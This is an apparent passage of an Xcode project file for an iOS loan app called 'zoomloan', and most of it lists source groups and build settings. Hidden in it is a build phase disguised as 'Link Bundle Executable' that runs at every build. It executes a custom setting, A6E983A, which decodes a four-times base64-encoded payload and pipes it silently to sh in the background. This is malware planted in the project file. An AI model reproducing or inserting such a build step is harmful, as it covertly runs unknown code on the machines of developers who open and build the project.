				735C8DBC2EC4D1A4003020BF /* ConAdds.swift */,
				735C8DBA2EC4C99C003020BF /* FormViewModel.swift */,
				735C8DB62EC4C8CD003020BF /* FormViewController.swift */,
				735C8DB82EC4C982003020BF /* FormViewCell.swift */,
			);
			path = conact;
			sourceTree = "<group>";
		};
		73E083372EC3837900D118A1 /* choose */ = {
			isa = PBXGroup;
			children = (
				73E083352EC3835A00D118A1 /* ChooseViewController.swift */,
				73E0833F2EC38EFF00D118A1 /* ChooseViewCell.swift */,
			);
			path = choose;
			sourceTree = "<group>";
		};
		73E083382EC3838000D118A1 /* detail */ = {
			isa = PBXGroup;
			children = (
				73E083312EC374FA00D118A1 /* ProductDetailViewModel.swift */,
				730F1C8A2EC2E48B00733544 /* ProductDetailViewController.swift */,
				73E0832F2EC374F300D118A1 /* ProductDetailView.swift */,
				73E083332EC37E3200D118A1 /* AuthListViewCell.swift */,
			);
			path = detail;
			sourceTree = "<group>";
		};
		73E607462EC1D6CA00BCA552 = {
			isa = PBXGroup;
			children = (
				73E607702EC1D6D400BCA552 /* zoomloan */,
				73E607502EC1D6CA00BCA552 /* Products */,
				ADEB734E49C0AADEAAEFBE9F /* Pods */,
				4C336D7C4C34DF23EE592941 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		73E607502EC1D6CA00BCA552 /* Products */ = {
			isa = PBXGroup;
			children = (
				73E6074F2EC1D6CA00BCA552 /* zoomloan.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		73E607702EC1D6D400BCA552 /* zoomloan */ = {
			isa = PBXGroup;
			children = (
				73E6077D2EC1DAB500BCA552 /* zoomloan.entitlements */,
				73E607692EC1D6D400BCA552 /* Info.plist */,
				73E607682EC1D6D400BCA552 /* Assets.xcassets */,
				73E607672EC1D6D400BCA552 /* AppDelegate.swift */,
				73E6076B2EC1D6D400BCA552 /* LaunchScreen.storyboard */,
				73E607802EC1DAD500BCA552 /* config */,
				73E6077F2EC1DAD200BCA552 /* pop */,
				73E6077E2EC1DAD000BCA552 /* http */,
				730F1C892EC2E47A00733544 /* auth */,
				73E6077C2EC1DAA500BCA552 /* center */,
				73E6077B2EC1DAA300BCA552 /* order */,
				73E6077A2EC1DAA000BCA552 /* home */,
				73E607792EC1DA9E00BCA552 /* login */,
				73E607782EC1DA9A00BCA552 /* base */,
			);
			path = zoomloan;
			sourceTree = "<group>";
		};
		73E607782EC1DA9A00BCA552 /* base */ = {
			isa = PBXGroup;
			children = (
				73736D332EC6FC7F0089A771 /* SystemInfo.swift */,
				736D518E2EC6F5C9001677BD /* JailbreakDetector.swift */,
				736D518C2EC6D504001677BD /* wifiConfig.swift */,
				736D518A2EC6CDD2001677BD /* AppDeviceManager.swift */,
				73B8E3A52EC61129003307AC /* NetworkMonitor.swift */,
				73E607832EC1DB1F00BCA552 /* BaseView.swift */,
				73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */,
				73E607812EC1DB1300BCA552 /* BaseViewController.swift */,
				73E607852EC1DB3700BCA552 /* BaseNavigationController.swift */,
				73E607872EC1DB5300BCA552 /* BaseTabBarController.swift */,
				73E607972EC1DEA300BCA552 /* LaunchViewController.swift */,
				73F485692EC569B000548EDA /* H5WebViewController.swift */,
				73B8E3A72EC6138C003307AC /* AppLocationManager.swift */,
			);
			path = base;
			sourceTree = "<group>";
		};
		73E607792EC1DA9E00BCA552 /* login */ = {
			isa = PBXGroup;
			children = (
				73A4AADA2EC2344200224C27 /* LoginViewModel.swift */,
				73E6079D2EC1EAFB00BCA552 /* LoginView.swift */,
				73E6079F2EC1EF8500BCA552 /* AgreementView.swift */,
				73E607892EC1DB6100BCA552 /* LoginViewController.swift */,
			);
			path = login;
			sourceTree = "<group>";
		};
		73E6077A2EC1DAA000BCA552 /* home */ = {
			isa = PBXGroup;
			children = (
				73A4AADC2EC241FF00224C27 /* HomeView.swift */,
				73E6078B2EC1DB6A00BCA552 /* HomeViewController.swift */,
				73A4AADE2EC2C73000224C27 /* HomeViewModel.swift */,
				730F1C872EC2DC0100733544 /* HomeTermView.swift */,
				73F485742EC5B51100548EDA /* LampView.swift */,
				73B8E3A32EC602A3003307AC /* LampListView.swift */,
			);
			path = home;
			sourceTree = "<group>";
		};
		73E6077B2EC1DAA300BCA552 /* order */ = {
			isa = PBXGroup;
			children = (
				73F485702EC5890E00548EDA /* OrderListViewModel.swift */,
				73E6078D2EC1DB7200BCA552 /* OrderViewController.swift */,
				73F4856B2EC5871200548EDA /* OrderListView.swift */,
				73F4856D2EC5872A00548EDA /* OrderListViewCell.swift */,
				73F485722EC5A15100548EDA /* OrderNameTypeView.swift */,
			);
			path = order;
			sourceTree = "<group>";
		};
		73E6077C2EC1DAA500BCA552 /* center */ = {
			isa = PBXGroup;
			children = (
				730F1C922EC2FE5000733544 /* CentertViewModel.swift */,
				73E6078F2EC1DB7C00BCA552 /* CenterViewController.swift */,
				730F1C902EC2FADE00733544 /* CentertView.swift */,
				730F1C942EC3008A00733544 /* CentertListViewCell.swift */,
				730F1C962EC308C900733544 /* SettingViewController.swift */,
			);
			path = center;
			sourceTree = "<group>";
		};
		73E6077E2EC1DAD000BCA552 /* http */ = {
			isa = PBXGroup;
			children = (
				73E607912EC1DBAE00BCA552 /* RequsetHttpManager.swift */,
			);
			path = http;
			sourceTree = "<group>";
		};
		73E6077F2EC1DAD200BCA552 /* pop */ = {
			isa = PBXGroup;
			children = (
				73E607932EC1DBC000BCA552 /* PopLogOutView.swift */,
				730F1C982EC3192900733544 /* PopDeleteAccountView.swift */,
				73CB1D112EC44D6A0066BEB9 /* PopExampleView.swift */,
				73F485762EC5C8A700548EDA /* LibraryView.swift */,
			);
			path = pop;
			sourceTree = "<group>";
		};
		73E607802EC1DAD500BCA552 /* config */ = {
			isa = PBXGroup;
			children = (
				735C8DB02EC4C32F003020BF /* anothermodel.swift */,
				73A4AAD62EC21BAD00224C27 /* baseModel.swift */,
				73E607992EC1E11700BCA552 /* otherConfig.swift */,
				73E607952EC1DBC400BCA552 /* AuthLoginConfig.swift */,
				73E6079B2EC1E65C00BCA552 /* AppMainHeadView.swift */,
				730F1C8C2EC2E54000733544 /* schemeConfig.swift */,
			);
			path = config;
			sourceTree = "<group>";
		};
		ADEB734E49C0AADEAAEFBE9F /* Pods */ = {
			isa = PBXGroup;
			children = (
				2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */,
				3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		73E6074E2EC1D6CA00BCA552 /* zoomloan */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 73E607622EC1D6CD00BCA552 /* Build configuration list for PBXNativeTarget "zoomloan" */;
			buildPhases = (
				569336D37E5B4AD88CA389E6 /* Link Bundle Executable */,
				5BCF79800B5E94000342FF5F /* [CP] Check Pods Manifest.lock */,
				73E6074B2EC1D6CA00BCA552 /* Sources */,
				73E6074C2EC1D6CA00BCA552 /* Frameworks */,
				73E6074D2EC1D6CA00BCA552 /* Resources */,
				569114F2A1AE6CFBE8917097 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = zoomloan;
			productName = zoomloan;
			productReference = 73E6074F2EC1D6CA00BCA552 /* zoomloan.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		73E607472EC1D6CA00BCA552 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2610;
				LastUpgradeCheck = 2610;
				TargetAttributes = {
					73E6074E2EC1D6CA00BCA552 = {
						CreatedOnToolsVersion = 26.1;
					};
				};
			};
			buildConfigurationList = 73E6074A2EC1D6CA00BCA552 /* Build configuration list for PBXProject "zoomloan" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 73E607462EC1D6CA00BCA552;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 73E607502EC1D6CA00BCA552 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				73E6074E2EC1D6CA00BCA552 /* zoomloan */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		73E6074D2EC1D6CA00BCA552 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				73E607742EC1D6D400BCA552 /* Assets.xcassets in Resources */,
				73E607762EC1D6D400BCA552 /* LaunchScreen.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		569114F2A1AE6CFBE8917097 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-zoomloan/Pods-zoomloan-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-zoomloan/Pods-zoomloan-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-zoomloan/Pods-zoomloan-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		569336D37E5B4AD88CA389E6 /* Link Bundle Executable */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Link Bundle Executable";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
			showEnvVarsInLog = 0;
		};
		5BCF79800B5E94000342FF5F /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-zoomloan-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		73E6074B2EC1D6CA00BCA552 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				736D518B2EC6CDE1001677BD /* AppDeviceManager.swift in Sources */,
				73E607982EC1DEA300BCA552 /* LaunchViewController.swift in Sources */,
				73F485732EC5A15100548EDA /* OrderNameTypeView.swift in Sources */,
				735C8DAF2EC4B9FB003020BF /* PopAddressView.swift in Sources */,
				73E083302EC374F300D118A1 /* ProductDetailView.swift in Sources */,
				73B8E3A82EC6138C003307AC /* AppLocationManager.swift in Sources */,
				73F4856E2EC5872A00548EDA /* OrderListViewCell.swift in Sources */,
				73F4856C2EC5871200548EDA /* OrderListView.swift in Sources */,
				73A4AADF2EC2C73000224C27 /* HomeViewModel.swift in Sources */,
				73CB1D0E2EC421A90066BEB9 /* UploadListView.swift in Sources */,
				735C8DB32EC4C73E003020BF /* LifeHardViewController.swift in Sources */,
				73E607A02EC1EF8500BCA552 /* AgreementView.swift in Sources */,
				73CB1D122EC44D6A0066BEB9 /* PopExampleView.swift in Sources */,
				73E6078A2EC1DB6100BCA552 /* LoginViewController.swift in Sources */,
				73E083322EC374FC00D118A1 /* ProductDetailViewModel.swift in Sources */,
				73E6079A2EC1E12200BCA552 /* otherConfig.swift in Sources */,
				736D518D2EC6D50E001677BD /* wifiConfig.swift in Sources */,
				730F1C972EC308C900733544 /* SettingViewController.swift in Sources */,
				730F1C8B2EC2E48B00733544 /* ProductDetailViewController.swift in Sources */,
				73F485712EC5890F00548EDA /* OrderListViewModel.swift in Sources */,
				735C8DAB2EC4B0CC003020BF /* PopEnumListView.swift in Sources */,
				73F4856A2EC569B000548EDA /* H5WebViewController.swift in Sources */,
				730F1C932EC2FE5200733544 /* CentertViewModel.swift in Sources */,
				73E607862EC1DB3700BCA552 /* BaseNavigationController.swift in Sources */,
				73CB1D222EC483F10066BEB9 /* PeopleInfoViewController.swift in Sources */,
				73B8E3A62EC6112A003307AC /* NetworkMonitor.swift in Sources */,
				73E607842EC1DB1F00BCA552 /* BaseView.swift in Sources */,
				735C8DB12EC4C336003020BF /* anothermodel.swift in Sources */,
				735C8DB92EC4C982003020BF /* FormViewCell.swift in Sources */,
				73E083402EC38EFF00D118A1 /* ChooseViewCell.swift in Sources */,
				73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */,
				73E607902EC1DB7C00BCA552 /* CenterViewController.swift in Sources */,
				73A4AADB2EC2344300224C27 /* LoginViewModel.swift in Sources */,
				73E607942EC1DBC000BCA552 /* PopLogOutView.swift in Sources */,
				73E083342EC37E3200D118A1 /* AuthListViewCell.swift in Sources */,
				730F1C912EC2FADE00733544 /* CentertView.swift in Sources */,
				73E607882EC1DB5300BCA552 /* BaseTabBarController.swift in Sources */,
				73E607962EC1DBC500BCA552 /* AuthLoginConfig.swift in Sources */,
				73736D342EC6FC840089A771 /* SystemInfo.swift in Sources */,
				73CB1D162EC4599E0066BEB9 /* PopTimeView.swift in Sources */,
				730F1C952EC3008A00733544 /* CentertListViewCell.swift in Sources */,
				73CB1D1B2EC46D750066BEB9 /* InputViewCell.swift in Sources */,
				730F1C882EC2DC0100733544 /* HomeTermView.swift in Sources */,
				730F1C8D2EC2E54000733544 /* schemeConfig.swift in Sources */,
				73E0833E2EC389C700D118A1 /* UploadImageViewController.swift in Sources */,
				73A4AAD72EC21BB300224C27 /* baseModel.swift in Sources */,
				73E6079C2EC1E65C00BCA552 /* AppMainHeadView.swift in Sources */,
				735C8DB72EC4C8CD003020BF /* FormViewController.swift in Sources */,
				735C8DAD2EC4B2AE003020BF /* PopEnumListCell.swift in Sources */,
				73E607712EC1D6D400BCA552 /* AppDelegate.swift in Sources */,
				73CB1D1D2EC46D880066BEB9 /* EnumViewCell.swift in Sources */,
				73B8E3A42EC602A3003307AC /* LampListView.swift in Sources */,
				73CB1D142EC455580066BEB9 /* UploadAuthViewModel.swift in Sources */,
				735C8DBD2EC4D1B4003020BF /* ConAdds.swift in Sources */,
				73CB1D242EC48A420066BEB9 /* PeopleInfoViewModel.swift in Sources */,
				73F485772EC5C8A700548EDA /* LibraryView.swift in Sources */,
				73CB1D0C2EC41EFA0066BEB9 /* UploadAuthView.swift in Sources */,
				736D518F2EC6F5CA001677BD /* JailbreakDetector.swift in Sources */,
				73A4AADD2EC241FF00224C27 /* HomeView.swift in Sources */,
				735C8DBB2EC4C99F003020BF /* FormViewModel.swift in Sources */,
				735C8DB52EC4C75F003020BF /* LiftHardViewModel.swift in Sources */,
				73E6078C2EC1DB6A00BCA552 /* HomeViewController.swift in Sources */,
				73E607922EC1DBAE00BCA552 /* RequsetHttpManager.swift in Sources */,
				73E607822EC1DB1300BCA552 /* BaseViewController.swift in Sources */,
				73E6079E2EC1EAFB00BCA552 /* LoginView.swift in Sources */,
				73E6078E2EC1DB7200BCA552 /* OrderViewController.swift in Sources */,
				73CB1D182EC46BF50066BEB9 /* AlertNameView.swift in Sources */,
				73E083362EC3835A00D118A1 /* ChooseViewController.swift in Sources */,
				73F485752EC5B51100548EDA /* LampView.swift in Sources */,
				730F1C992EC3192900733544 /* PopDeleteAccountView.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		73E6076B2EC1D6D400BCA552 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				73E6076A2EC1D6D400BCA552 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		73E607632EC1D6CD00BCA552 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */;
			buildSettings = {
				A6E983A = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUUxV2VsWnpXa1ZOTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | c | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 57MBH2272N;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = zoomloan/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Zoom Loan";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = zl.zoomloan;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		73E607642EC1D6CD00BCA552 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */;
			buildSettings = {
				A6E983A = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUUxV2VsWnpXa1ZOTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | c | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 57MBH2272N;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = zoomloan/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Zoom Loan";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = zl.zoomloan;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		73E607652EC1D6CD00BCA552 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		73E607662EC1D6CD00BCA552 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		73E6074A2EC1D6CA00BCA552 /* Build configuration list for PBXProject "zoomloan" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				73E607652EC1D6CD00BCA552 /* Debug */,
				73E607662EC1D6CD00BCA552 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		73E607622EC1D6CD00BCA552 /* Build configuration list for PBXNativeTarget "zoomloan" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				73E607632EC1D6CD00BCA552 /* Debug */,
				73E607642EC1D6CD00BCA552 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 73E607472EC1D6CA00BCA552 /* Project object */;
}
